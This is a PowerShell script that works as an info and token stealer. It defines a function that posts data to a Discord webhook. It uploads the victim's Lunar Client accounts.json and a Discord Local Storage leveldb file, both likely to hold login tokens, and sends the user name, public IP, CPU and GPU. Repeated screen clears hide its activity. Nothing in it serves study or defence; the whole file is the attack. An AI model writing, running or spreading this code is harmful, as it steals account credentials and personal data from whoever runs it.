function Upload-Discord {

[CmdletBinding()]
param (
    [parameter(Position=0,Mandatory=$False)]
    [string]$file,

    [parameter(Position=1,Mandatory=$False)]
    [string]$text 
)


$Body = @{
  'content' = $text
}


if (-not ([string]::IsNullOrEmpty($text))){
Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};

if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
}
cls



$gpu = (Get-WmiObject win32_VideoController).Name
$cpu = (Get-WmiObject Win32_Processor).Name
$ip = (Invoke-WebRequest -uri "https://api.ipify.org/").Content
cls

Upload-Discord -text "-----------------------------@everyone-------------------------------------------"
Upload-Discord -file "C:\Users\$env:UserName\.lunarclient\settings\game\accounts.json"
Upload-Discord -file "C:\Users\zakar\AppData\Roaming\discord\Local Storage\leveldb\000012.ldb"
cls
Upload-Discord -text "-----------------------------INFO-PC---------------------------------------------"
Upload-Discord -text "Name: $env:UserName"
Upload-Discord -text "--------------"
Upload-Discord -text "IPV4: $ip"
Upload-Discord -text "---"
Upload-Discord -text "CPU: $cpu"
Upload-Discord -text "---"
Upload-Discord -text "GPU: $gpu"
Upload-Discord -text "-----------------------------@everyone-------------------------------------------"
